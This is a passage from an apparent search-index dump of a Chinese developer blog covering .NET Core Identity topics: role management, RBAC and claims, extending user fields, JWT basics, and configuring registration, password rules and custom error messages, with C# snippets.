'OnModelCreating'. For more information on keyless entity types, see https://go.microsoft.com/fwlink/?linkid=2141943. 後來發現少了一句base.OnModelCreating(modelBuilder);，參考c# - The entity type ‘IdentityUserLogin\u003cstring\u003e’ requires a primary key to be defined - Stack Overflow AppContextDb.cs base.OnModelCreating(modelBuilder); var foreignKeys = modelBuilder.Model.GetEntityTypes().SelectMany(e =\u003e e.GetForeignKeys()); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } Powershell 以下指令就會成功了 Add-Migration DeleteBehaviorRestrict 其他相關IdentityASP.NET Core 中的模型自訂 | Microsoft Docs 刪除含有帳號的角色會看到Exception。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:3:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"指定 Identity Table 外來鍵設定 上面寫法我覺得程式很少，不能做到特定篩選，我怕日後這些程式碼會不會影響我建立關聯的Entity，所以我找相關可以取代指定 Entity方法。後來拼拼湊湊組成下面這個。 var foreignKeys = modelBuilder.Entity\u003cIdentityUserRole\u003cstring\u003e\u003e().Metadata.GetForeignKeys(); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } foreignKeys = modelBuilder.Entity\u003cIdentityUserToken\u003cstring\u003e\u003e().Metadata.GetForeignKeys(); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } foreignKeys = modelBuilder.Entity\u003cIdentityUserClaim\u003cstring\u003e\u003e().Metadata.GetForeignKeys(); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } foreignKeys = modelBuilder.Entity\u003cIdentityUserLogin\u003cstring\u003e\u003e().Metadata.GetForeignKeys(); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } foreignKeys = modelBuilder.Entity\u003cIdentityRoleClaim\u003cstring\u003e\u003e().Metadata.GetForeignKeys(); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } 我還是不建議用上面方法，反思為什麼不用程式去查詢判斷 IdentityUserRole 相關資料表有沒有料?透過程式去阻擋?這都是可以解決的。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:4:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"參考來源 ASP.NET Identity 2 使用 EntityFramework 搭配 Oracle - Yowko’s Notes aspnetcore/IdentityDbContext.cs at main · dotnet/aspnetcore c# - how to apply common configuration to all entities in ef core - Stack Overflow c# - How to use the IMutableEntityType AddForeignKey() function - Stack Overflow IdentityASP.NET Core 中的模型自訂 | Microsoft Docs ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:5:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"我們常常開發程式帳號登入，通常還會做權限功能，這邊很常開發會用角色(Role)這個東西，去做權限劃分，有時候我們需要更細，但系統不一定會做到這樣，但有沒有常見規劃權限方法。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:0:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"常見權限方法 之前看到 RBAC這個名詞是在 Kubernetes 那邊看到，那時候還沒有深入了解設計理念，最近在看 .Net Core Identity 文章，看到這個框架有做這個非常方便東西，可以瞭解這個是什麼用途。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:1:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"RBAC 以角色為基礎的存取控制[1][2]（英語：Role-based access control，RBAC），是資訊安全領域中，一種較新且廣為使用的存取控制機制，其不同於強制存取控制以及自由選定存取控制[3]直接賦予使用者權限，而是將權限賦予角色。 以角色為基礎的存取控制模型是一套較強制存取控制以及自由選定存取控制更為中性且更具靈活性的存取控制技術。 參考: 以角色為基礎的存取控制 - 維基百科，自由的百科全書 更多可以看Role-Based Access Control (RBAC). 作者：銀伶 | by I.S. BLOG | Medium。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:1:1","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"CBAC Claim 動詞則有宣稱,聲稱, 主張, 自稱, 指控, 認領,索賠等意思 名詞則有權利 , 要求權和聲明等 Claims-based 則是一個專有詞，代表基於聲明的認證(Claims-based identity) 用於Google，Facebook，Microsoft等都有此機制的概念導入 參考: ASP.NET MVC第014天_ASP.NET Identity使用筆記_使用者登入_Claims-based identity理解 網路上比較少介紹 CBAC，簡單它可以分更細權限，這邊帳號可以設定特定角色，但是有時候有例外，像是帳號想把它加上權限上去，透過CBAC就可以設定。但注意 Claim不是只有套用在帳號上面，也可以套用帳號上面。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:1:2","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"建立角色 GIT: 建立角色 · malagege/NetCoreAuthSample@578bdd6 RoleManager 可以簡單對 Role 做 CRUD。會新增到 AspNetRoles 資料表。 Controller 注入 RoleManager 建立ModelView Controller 建立Role View 設定 簡單步驟跟之前差不多 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:2:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"角色清單 _roleManager.Roles 抓出所有角色資料。 GIT: 角色列表 · malagege/NetCoreAuthSample@3fa29c7 Controller,View 那些不寫了，這邊還順便複習View 要怎麼寫。公司目前後端很少寫 View。 主要同一個 Action 有 Get, Post 方法，所以\u003cfrom\u003e就不需要特別設定 asp-action，這個設計值得效仿。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:3:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"編輯角色 GIT:編輯角色_修改名稱 · malagege/NetCoreAuthSample@6f56c8b 同上 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:4:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"角色下使用者清單 GIT: 角色顯示使用者清單 · malagege/NetCoreAuthSample@d913d9d ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:5:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"Model List 屬性初始化 GIT:初始化使用者清單 · malagege/NetCoreAuthSample@4ab3828 常常用List遇到 NullPointerException 問題，這邊我們用這個技巧可以避免。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:5:1","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"角色下添加/刪除使用者 GIT: 使用者添加角色 · malagege/NetCoreAuthSample@2a21605 // ***重點*** Start // 選擇跟查詢結果不一樣，更改資料 bool isInRole = await _userManager.IsInRoleAsync(user, role.Name); if (model[i].IsSelected \u0026\u0026 !(isInRole)) { result = await _userManager.AddToRoleAsync(user, role.Name); // 使用者角色新增 role.Name } else if (!model[i].IsSelected \u0026\u0026 (isInRole)) { result = await _userManager.RemoveFromRoleAsync(user, role.Name); // 使用者角色移除 role.Name } else { continue; //與資料庫一樣不做處理 } if (result.Succeeded) { if(i \u003c (model.Count - 1)) //簡單來說，第一次和中間次數跑 continue 執行最後一次會跑 else 內容 { continue; } else { return RedirectToAction(\"EditRole\", new { Id = roleId }); } } // ***重點*** End await _userManager.AddToRoleAsync(user, role.Name);和ㄏ(user, role.Name); 可以讓使用者加入角色，注意使用者和角色資料表示多對多的。我們知道資料表多對多是要用到三個資料表。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:6:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"資料表 我們操作這個範例，可以看到我們用_userManager.AddToRoleAsync和_userManager.AddToRoleAsync控制這些表資料。.Net Core Identity 不只下面這些表，後續整理相關筆記會特別畫 ERD 關聯。 erDiagram AspNetUsers }|..|{ AspNetRoles : has 多對多關係是用三張表去做關聯 erDiagram AspNetUsers ||..|{ AspNetUserRoles : has AspNetUserRoles }|..|| AspNetRoles : own AspNetUsers{ string id string UserName string Email } AspNetUserRoles{ string UserId string RoleId } AspNetRoles{ string Id string Name string NormalizeName } ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:7:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"思考問題 效能問題(n+1) 用Users跑 for迴圈，不知道這樣設定資料是不是好事?假如users到一萬筆可能跑迴圈也是不好的事情，所以這邊可以思考從使用者那邊設定角色是不是好的解決方法 執行發生錯誤，能否rollback 我們使用 EF Core都會用到 savechanges()去判斷是否要做commit，這邊我猜測 context應該有跟savechanges做 commit一樣動作，但我現階段先不測試。 UserManager,RoleManager 設計模式，回傳XXXResult 物件 上面我們看到有做 xxxResult，這部分針對 ModelState.AddError搭配使用還滿方便，平常寫 Service 很少寫這個物件，這個有空看看相關文章有沒有這一層物件設計模式處理。 Net Core Identity 資料表關係 這章節只用到這三張表，我有偷看後續表，針對使用上 Net Core Identity 會異動那些資料表資料，我覺得這是很重要的事情。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:8:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"彩蛋 [ASP.NET MVC] 使用CLK.AspNet.Identity提供以角色為基礎的存取控制(RBAC) | 昏睡領域 - 點部落 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/:9:0","tags":[".netcore"],"title":".Net Core Identity 角色管理","uri":"/blog/posts/DotNet-Core-Identity-%E8%A7%92%E8%89%B2%E7%AE%A1%E7%90%86/"},{"categories":[".Net Core"],"content":"IdentityUser Class (Microsoft.AspNetCore.Identity.EntityFrameworkCore) | Microsoft Docs裡面我們可以看到有基本欄位，但沒有其他資料，如: 性別、城市和國家等資訊。所以我們需要擴展 User 資料欄位方法。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:0:0","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"操作流程 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:1:0","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"1. 新增 class 繼承 IdentityUser public class ApplicationUser : IdentityUser { public string City { get; set; } } ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:1:1","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"2. AppDbContext 修改參數 // IdentityDbContext 預設為IdentityUser ，擴展 User 類別帶入IdentityDbContext public class AppDbContext : IdentityDbContext\u003cApplicationUser\u003e { public AppDbContext(DbContextOptions\u003cAppDbContext\u003e options) : base(options) { } } ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:1:2","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"3. Migration DB Add-Migration Extend_IdentityUser Update-Database ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:1:3","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"4. View 擺上新增欄位 View \u003cdiv\u003e \u003clabel asp-for=\"City\"\u003e\u003c/label\u003e \u003cinput asp-for=\"City\" /\u003e \u003cspan asp-validation-for=\"City\"\u003e\u003c/span\u003e \u003c/div\u003e Controller var user = new ApplicationUser { UserName = model.Email, Email = model.Email, City = model.City, }; 詳細可以看GIT。 GIT: 擴展 IdentityUser 欄位 · malagege/NetCoreAuthSample@b36f5e0 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/:1:4","tags":[".netcore","identity"],"title":".Net Core Identity 擴展 User 資料欄位","uri":"/blog/posts/DotNet-Core-Identity-%E6%93%B4%E5%B1%95-User-%E8%B3%87%E6%96%99%E6%AC%84%E4%BD%8D/"},{"categories":[".Net Core"],"content":"平常我們前後端開發會使用 JWT Token，JWT Token 有讀過相關文章就知道它裡面會存一些資訊，相關驗證都會在 JWT 上面，Server 讀取上面資料就知道是哪一個使用者，不需要在做資料庫查詢。這時候你會覺得這樣安全嗎?但其實它背後原理有做簽章，當你串改資料，JWT 驗證是不會過的，相對機密資料就不建議存在上面。 ","date":"2023-01-16","objectID":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/:0:0","tags":[".netcore"],"title":"產生 JWT Token 方法","uri":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"JWT 介紹 網路上一堆好文，這邊就不整理了。 是誰在敲打我窗？什麼是 JWT ？ | 五倍紅寶石・專業程式教育 這邊擷取幾個重點，推薦還是進去上面看。 JWT 的組成 header payload signature/encryption data …… Registered Claims 包含： sub：subject 的簡稱，用字串(case-sensitive) 或 URI 表示這個 JWT 所夾帶的唯一識別訊息。 exp：expiration(time) 的簡稱，一個用來表示特定日期和時間的數字，格式為 POSIX 定義的 自紀元以來的秒數，即 UNIX時間。此聲明設置了該 JWT 被視為無效的確切時間。一些實踐可能允許時間存在一定的偏差(考慮此 JWT 在到期日期後的幾分鐘內有效)。 這邊簡單擷取幾個重點，sub這邊取到資料是唯一值的，可以把這個存在資料庫。exp是過期時間，通常驗證不過可能也需要注意這個。 JWT(JSON Web Token) — 原理介紹. 自從RESTful架構興起後，越來越多人提倡使用JWT來取代傳統Session的… | by 陳冠億 Kenny | 企鵝也懂程式設計 | Medium ","date":"2023-01-16","objectID":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/:1:0","tags":[".netcore"],"title":"產生 JWT Token 方法","uri":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"產生 JWT Token 最後還是發現JSON Web Tokens - jwt.io這個網站最好用，這個網站是用靜態網站去產生，所以是非常方便。 可以貼上 private key 調整 payload 資料作調整。 其他網站: Online JWT Builder - Jamie Kurtz Online JWT Generator ","date":"2023-01-16","objectID":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/:2:0","tags":[".netcore"],"title":"產生 JWT Token 方法","uri":"/blog/posts/%E7%94%A2%E7%94%9F-JWT-Token-%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"這邊重零開始建置 Net Core Identity。 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:0:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"步驟 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:0","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"1. Net Core Identity 設定 GIT可參考下面 資料庫設定 · malagege/NetCoreAuthSample@bcce6fc Identity.EFCore 設定 · malagege/NetCoreAuthSample@211ca25 安裝基本元件 \u003cPackageReference Include=\"Microsoft.AspNetCore.Identity.EntityFrameworkCore\" Version=\"5.0.17\" /\u003e \u003cPackageReference Include=\"Microsoft.EntityFrameworkCore\" Version=\"5.0.17\" /\u003e \u003cPackageReference Include=\"Microsoft.EntityFrameworkCore.Relational\" Version=\"5.0.17\" /\u003e \u003cPackageReference Include=\"Microsoft.EntityFrameworkCore.SqlServer\" Version=\"5.0.17\" /\u003e 注意DbContext繼承要調整 IdentityDbContext public class AppDbContext : IdentityDbContext { public AppDbContext(DbContextOptions\u003cAppDbContext\u003e options) : base(options) { } } Startup.cs services.AddIdentity\u003cIdentityUser, IdentityRole\u003e() .AddEntityFrameworkStores\u003cAppDbContext\u003e(); 剩下看GIT。 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:1","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"2. Migration DB Add-Migration AddingIdentity 會自動產生 參考: NetCoreAuthSample/20220811093637_AddingIdentity.Designer.cs at 0fad9d029b4097257e365ded0c7727058a3e81ad · malagege/NetCoreAuthSample ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:2","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"3. 註冊帳號頁面處理 GIT:註冊帳號 · malagege/NetCoreAuthSample@0fad9d0 新增檔案就不特別寫，都在GIT上。 要了解的是 SignInManager 可以做登入/登出動作 UserManager 可以新增帳號動作 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:3","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"4. 註冊密碼檢核設定 GIT: 註冊密碼檢核設定 · malagege/NetCoreAuthSample@a70bc35 services.Configure\u003cIdentityOptions\u003e(options =\u003e { // 密碼最小長度 (預設值:6) options.Password.RequiredLength = 6; // 密碼中允許最大重複字符數 (ex: \"aaa123\" ,\"abbb123\") axabac 會過 options.Password.RequiredUniqueChars = 3; // 至少使用非字母數字字符 (預設值: true) options.Password.RequireNonAlphanumeric = false; // 密碼是否包含小寫 (預設值: true) options.Password.RequireLowercase = false; // 密碼是否包含大寫 (預設值: true) options.Password.RequireUppercase = false; }); 選上下方法其中一個 services.AddIdentity\u003cIdentityUser, IdentityRole\u003e(options =\u003e { // 密碼最小長度 (預設值:6) options.Password.RequiredLength = 6; // 密碼中允許最大重複字符數 (ex: \"aaa123\" ,\"abbb123\") axabac 會過 options.Password.RequiredUniqueChars = 3; // 至少使用非字母數字字符 (預設值: true) options.Password.RequireNonAlphanumeric = false; // 密碼是否包含小寫 (預設值: true) options.Password.RequireLowercase = false; // 密碼是否包含大寫 (預設值: true) options.Password.RequireUppercase = false; });) 這邊可以設定有 UserOptions SignInOptions LockoutOptions TokenOptions StoreOptions ClaimsIdentityOptions ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:4","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"5. 自訂錯誤訊息 GIT:自訂義錯誤訊息 · malagege/NetCoreAuthSample@b1203f6 public class CustomIdentityErrorDescriber : IdentityErrorDescriber { public override IdentityError DefaultError() { return new IdentityError { Code = nameof(DefaultError), Description = $\"未知錯誤！\" }; } public override IdentityError ConcurrencyFailure() { return new IdentityError { Code = nameof(ConcurrencyFailure), Description = \"並發錯誤，對象已被修改！\" }; } public override IdentityError PasswordMismatch() { return new IdentityError { Code = \"Password\", Description = \"密碼錯誤！\" }; } public override IdentityError InvalidToken() { return new IdentityError { Code = nameof(InvalidToken), Description = \"無效 token.\" }; } public override IdentityError LoginAlreadyAssociated() { return new IdentityError { Code = nameof(LoginAlreadyAssociated), Description = \"當前用戶已經登錄！\" }; } public override IdentityError InvalidUserName(string userName) { return new IdentityError { Code = \"UserName\", Description = $\"用戶名 '{userName}' 錯誤，只可以包含數字和字母！\" }; } public override IdentityError InvalidEmail(string email) { return new IdentityError { Code = \"Email\", Description = $\"信箱 '{email}' 格式錯誤！\" }; } public override IdentityError DuplicateUserName(string userName) { return new IdentityError { Code = \"UserName\", Description = $\"帳號 '{userName}' 已存在！\" }; } public override IdentityError DuplicateEmail(string email) { return new IdentityError { Code = \"Email\", Description = $\"信箱 '{email}' 已經存在！\" }; } public override IdentityError InvalidRoleName(string role) { return new IdentityError { Code = nameof(InvalidRoleName), Description = $\"角色 '{role}' 驗證錯誤！\" }; } public override IdentityError DuplicateRoleName(string role) { return new IdentityError { Code = nameof(DuplicateRoleName), Description = $\"角色名 '{role}' 已經存在！\" }; } public override IdentityError UserAlreadyHasPassword() { return new IdentityError { Code = nameof(UserAlreadyHasPassword), Description = \"此帳號設定密碼了\" }; } public override IdentityError UserLockoutNotEnabled() { return new IdentityError { Code = nameof(UserLockoutNotEnabled), Description = \"此帳號未鎖定\" }; } public override IdentityError UserAlreadyInRole(string role) { return new IdentityError { Code = nameof(UserAlreadyInRole), Description = $\"使用者已關聯角色 '{role}'.\" }; } public override IdentityError UserNotInRole(string role) { return new IdentityError { Code = nameof(UserNotInRole), Description = $\"使用者沒有關聯角色 '{role}'.\" }; } public override IdentityError PasswordTooShort(int length) { return new IdentityError { Code = \"Password\", Description = $\"密碼至少 {length} 位！\" }; } public override IdentityError PasswordRequiresNonAlphanumeric() { return new IdentityError { Code = \"Password\", Description = \"密碼必須至少有一個非字母數字字符.\" }; } public override IdentityError PasswordRequiresDigit() { return new IdentityError { Code = \"Password\", Description = \"密碼至少有一個數字 ('0'-'9').\" }; } public override IdentityError PasswordRequiresLower() { return new IdentityError { Code = \"Password\", Description = \"密碼必須包含小寫字母 ('a'-'z').\" }; } public override IdentityError PasswordRequiresUpper() { return new IdentityError { Code = \"Password\", Description = \"密碼必須包含大寫字母 ('A'-'Z').\" }; } } 插入這一行.AddErrorDescriber\u003cCustomIdentityErrorDescriber\u003e()，如下面。 services.AddIdentity\u003cIdentityUser, IdentityRole\u003e() .AddErrorDescriber\u003cCustomIdentityErrorDescriber\u003e() .AddEntityFrameworkStores\u003cAppDbContext\u003e(); ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:5","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 實作網頁登入登出","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/"},{"categories":[".Net Core"],"content":"6. View 判斷是否登入 View 顯示帳號是否登入方法 · malagege/NetCoreAuthSample@43c6275 ","date":"2023-01-16","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-DotNet-Core-Identity-%E5%AF%A6%E4%BD%9C%E7%B6%B2%E9%A0%81%E7%99%BB%E5%85%A5-%E7%99%BB%E5%87%BA/:1:6","tags":[".netcore","identity"],"title":"使用 .Net Core Identity 